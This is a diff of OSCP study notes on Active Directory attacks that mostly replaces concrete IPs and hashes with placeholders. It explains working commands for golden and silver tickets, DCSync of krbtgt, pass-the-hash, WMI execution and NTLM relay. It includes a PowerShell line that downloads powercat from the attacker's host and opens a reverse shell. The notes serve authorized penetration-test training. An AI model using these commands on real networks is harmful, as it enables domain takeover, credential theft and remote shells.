@@ -64,7 +64,7 @@ Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname=
 
 **Piece by piece:**
 - `golden` → Rubeus subcommand for forging a golden ticket (a Kerberos TGT signed with the KRBTGT hash, bypassing normal authentication).
-- `/rc4:<hash>` → the KRBTGT account's NTLM hash from the child domain. This is what makes the ticket cryptographically valid: the KDC accepts any ticket signed with this key as legitimate.
+- `/rc4:$AdminHash` → the KRBTGT account's NTLM hash from the child domain. This is what makes the ticket cryptographically valid: the KDC accepts any ticket signed with this key as legitimate.
 - `/domain:CHILD.PARENT.LOCAL` → the child domain's FQDN. The ticket claims to be from this realm.
 - `/sid:S-1-5-21-CHILD...` → the child domain's SID. Included in the PAC so the KDC can resolve the user's domain membership.
 - `/sids:S-1-5-21-PARENT...-519` → the **ExtraSids** field. This is an additional SID array injected into the ticket's PAC. `519` is the Enterprise Admins RID. WITHIN_FOREST trusts don't strip extra SIDs (SID filtering only applies to cross-forest trusts), so the parent DC honours this injected group membership and treats the ticket holder as an Enterprise Admin.
@@ -98,7 +98,7 @@ dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountContro
 
 **Where this comes from:** [[22. Active Directory Introduction and Enumeration|AD.8.3]]; LDAP filter syntax from RFC 4515
 
-**Where to look in the response:** any account where the description field contains something like "Password123!" or "last changed 2019-03". Disabled admin accounts with memorable descriptions are common in enterprise environments that don't have a formal offboarding process.
+**Where to look in the response:** any account where the description field contains something like "$Password" or "last changed 2019-03". Disabled admin accounts with memorable descriptions are common in enterprise environments that don't have a formal offboarding process.
 
 🔁 **Seen in:** [[22. Active Directory Introduction and Enumeration|AD.8]] Living Off the Land section, adunn appeared with description → Q answer HTB{LD@P_I$_W1ld}
 
@@ -157,7 +157,7 @@ mimikatz # kerberos::golden /ptt /sid:S-1-5-21-1987370270-658905905-1781884369 /
 - `/domain:corp.com` — the domain FQDN. Must match the domain the target server is in.
 - `/target:web04.corp.com` — the FQDN of the application server whose service you're forging a ticket for. This is what makes it a silver ticket: the ticket is scoped to ONE specific server, not the whole domain.
 - `/service:http` — the Kerberos service class. This must match the SPN class registered for the target account (e.g. `http`, `cifs`, `host`, `ldap`, `mssql`, `wsman`). The application server checks that the ticket's service class matches what it expects.
-- `/rc4:<hash>` — the NTLM hash of the SERVICE ACCOUNT (not krbtgt). Silver tickets are encrypted with the service account's hash because the app server decrypts them, not the KDC. This is the key asymmetry: the KDC is not involved at all after the ticket is forged.
+- `/rc4:$AdminHash` — the NTLM hash of the SERVICE ACCOUNT (not krbtgt). Silver tickets are encrypted with the service account's hash because the app server decrypts them, not the KDC. This is the key asymmetry: the KDC is not involved at all after the ticket is forged.
 - `/user:jeffadmin` — the username to claim inside the forged ticket. This controls what the application server thinks you are (and what group memberships your ticket claims). Any name works — it doesn't need to exist in AD.
 
 **Why PAC validation doesn't stop this:** the PAC (Privilege Attribute Certificate) inside the ticket claims whatever group memberships we put in. Most application servers skip the optional step of asking the KDC to verify the PAC, they just trust the ticket contents. This is the fundamental design choice that makes silver tickets work.
@@ -187,7 +187,7 @@ Mimikatz opens an RPC connection to the DC and calls `IDL_DRSGetNCChanges`, part
 **Piece by piece:**
 - `lsadump::dcsync` — the Mimikatz module for DRS-based credential extraction. No need to be on the DC; no need to touch LSASS. The credentials are pulled via legitimate-looking DC replication traffic.
 - `/user:corp\krbtgt` — the target account to replicate. The DC returns the full attribute set for that account including the current + history NTLM hash, AES-256 key, AES-128 key, LM hash (if available), Kerberos keys, and password history. Without this flag: dumps all accounts (very noisy, very large).
-- `/domain:DOMAIN.LOCAL` — required when not running from a domain-joined machine or when targeting a different domain. Omit when already in the target domain context.
+- `/domain:$Domain` — required when not running from a domain-joined machine or when targeting a different domain. Omit when already in the target domain context.
 
 **Why krbtgt first:** the krbtgt NTLM hash enables golden ticket forgery, a forged TGT that the KDC will validate as legitimate (since it's signed with the real key). Golden tickets survive account password changes (until krbtgt is rotated twice) and give persistent DA access. Pull krbtgt before anything else.
 
@@ -213,7 +213,7 @@ mimikatz # sekurlsa::pth /user:maria /domain:corp.com /ntlm:2a944a58d4ffa77137b2
 - `sekurlsa::pth` — "Pass the Hash" via the security support provider layer. Creates a new process with a spoofed authentication token using the hash instead of the plaintext password. The NTLM hash IS the password for network authentication — Windows never needs to reverse it.
 - `/user:maria` — the account to impersonate. Must be a valid account name (used to construct the authentication token).
 - `/domain:corp.com` — the domain FQDN for the account. Use the NetBIOS domain name (CORP) for local accounts.
-- `/ntlm:<hash>` — the NTLM hash from LSASS (via sekurlsa::logonpasswords or DCSync output). This is the NT hash portion — hashcat -m 1000 cracks it, or you skip cracking and use it directly here.
+- `/ntlm:$AdminHash` — the NTLM hash from LSASS (via sekurlsa::logonpasswords or DCSync output). This is the NT hash portion — hashcat -m 1000 cracks it, or you skip cracking and use it directly here.
 - `/run:powershell` — the command to run in the new process (defaults to `cmd.exe` if omitted). The new process runs under a new logon session with maria's token. Local operations in that window still run as the user who launched Mimikatz — only NETWORK authentication (UNC paths, WinRM, SMB) uses maria's credentials.
 
 **The critical detail:** the new PowerShell window can do `type \\dc1\c$\...` or `net use` against remote resources because those go through NTLM (hashed credentials over the wire). But local commands like `whoami` will still show the original user, the token only activates for outbound network auth.
@@ -222,7 +222,7 @@ mimikatz # sekurlsa::pth /user:maria /domain:corp.com /ntlm:2a944a58d4ffa77137b2
 - `sekurlsa::pth` → spawns an interactive shell on the CURRENT Windows machine → ideal for GUI/interactive exploration
 - `impacket-psexec -hashes` → remote shell on the TARGET machine → ideal from Kali
 
-🔁 **Seen in:** [[23. Attacking Active Directory Authentication#23.2.5 Domain Controller Synchronization (DCSync)|Module 23 §23.2.5 Capstone VM Group 2]]. PtH as maria → accessed \\192.168.249.70\c$\ → flag.txt
+🔁 **Seen in:** [[23. Attacking Active Directory Authentication#23.2.5 Domain Controller Synchronization (DCSync)|Module 23 §23.2.5 Capstone VM Group 2]]. PtH as maria → accessed \\$BoxIP\c$\ → flag.txt
 
 ---
 
@@ -233,7 +233,7 @@ mimikatz # sekurlsa::pth /user:maria /domain:corp.com /ntlm:2a944a58d4ffa77137b2
 **Full command set:**
 ```powershell
 $options = New-CimSessionOption -Protocol DCOM
-$session = New-CimSession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $options
+$session = New-CimSession -ComputerName $BoxIP -Credential $credential -SessionOption $options
 Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $command}
 ```
 
@@ -290,7 +290,7 @@ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 sudo impacket-ntlmrelayx \
   --no-http-server \
   -smb2support \
-  -t 192.168.50.242 \
+  -t $BoxIP \
   -c "powershell -enc SQBFAFgA..."
 ```
 
@@ -298,21 +298,21 @@ sudo impacket-ntlmrelayx \
 - `sudo` → port 445 requires root. ntlmrelayx opens an SMB server on 445 to catch inbound authentication. Without sudo, the bind fails silently.
 - `--no-http-server` → disables the HTTP capture listener. ntlmrelayx can listen on both HTTP and SMB simultaneously; disabling HTTP avoids port conflicts when another service (nginx, wsgidav, python http.server) is already bound to 80.
 - `-smb2support` → enables SMB2/3 relay. SMB1 is disabled on all modern Windows (post-2017 security patches). Without this flag, ntlmrelayx only speaks SMB1 and the inbound connection is rejected before the relay attempt.
-- `-t 192.168.50.242` → the relay target. ntlmrelayx forwards the captured NTLM tokens to this address as if it were the original client. The target must have SMB signing **disabled** — check with `crackmapexec smb <targets> --gen-relay-list relayable.txt` or look for `signing:False` in CME output.
+- `-t $BoxIP` → the relay target. ntlmrelayx forwards the captured NTLM tokens to this address as if it were the original client. The target must have SMB signing **disabled** — check with `crackmapexec smb $BoxIP --gen-relay-list relayable.txt` or look for `signing:False` in CME output.
 - `-c "powershell -enc ..."` → command to execute on the relay target in the context of the relayed account. Runs via the Windows Service Control Manager (SCM), so the command needs to be short (SCM has a command-length limit). Base64+`-enc` avoids quoting problems with special characters.
 
 **Why base64 encoding for `-c`?** ntlmrelayx passes the `-c` string through Win32 SCM's `CreateService` → `StartService` API. Special characters (`'`, `(`, `)`, `;`, `/`) in the raw PowerShell payload break the SCM argument parser. Encoding as UTF-16LE base64 and running via `powershell -enc` bypasses all quoting issues — the encoded string is a single quoted argument with no special chars.
 
 **Generate the payload (must be UTF-16LE, not UTF-8):**
 ```powershell
-$Text  = "IEX(New-Object System.Net.WebClient).DownloadString('http://<KALI>:8888/powercat.ps1');powercat -c <KALI> -p 9999 -e powershell"
+$Text  = "IEX(New-Object System.Net.WebClient).DownloadString('http://$LocalIP:8888/powercat.ps1');powercat -c $LocalIP -p 9999 -e powershell"
 $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)   # Unicode = UTF-16LE in .NET
 [Convert]::ToBase64String($Bytes)
 ```
 
 **What triggers the relay?** Any application feature that initiates an outbound UNC/SMB connection to an attacker-controlled path. In the module context: WordPress Backup Migration plugin → backup directory set to `//KALI_IP/test`. Other triggers: printer settings pages, MSI install paths, network share browsing links.
 
-**Where to look in the output:** `[*] Authenticating against smb://<target> as <DOMAIN>/<USER> SUCCEED` → relay worked. `[*] Executed specified command on host: <target>` → SCM ran the command. A few seconds later your nc listener catches the shell.
+**Where to look in the output:** `[*] Authenticating against smb://$BoxIP as $Domain/$Username SUCCEED` → relay worked. `[*] Executed specified command on host: $BoxIP` → SCM ran the command. A few seconds later your nc listener catches the shell.
 
 🔁 **Seen in:** [[27. Assembling the Pieces#27.5.2 NTLM Relay via WordPress Backup Migration Plugin|Assembling the Pieces#27.5.2 NTLM Relay via WordPress Backup Migration Plugin]]
 
@@ -429,3 +429,14 @@ This creates a point-in-time snapshot of C:. Locked files such as `ntds.dit` can
 - [RevShells](https://www.revshells.com/) for payload troubleshooting
 - [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
 - [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches
+## Why this matters for OSCP
+
+This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.
+
+## Related Modules
+
+- [[MODULES/22. Active Directory Introduction and Enumeration]] -- module concepts used by this hub page
+
+## Demonstrated in box write-ups
+
+- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
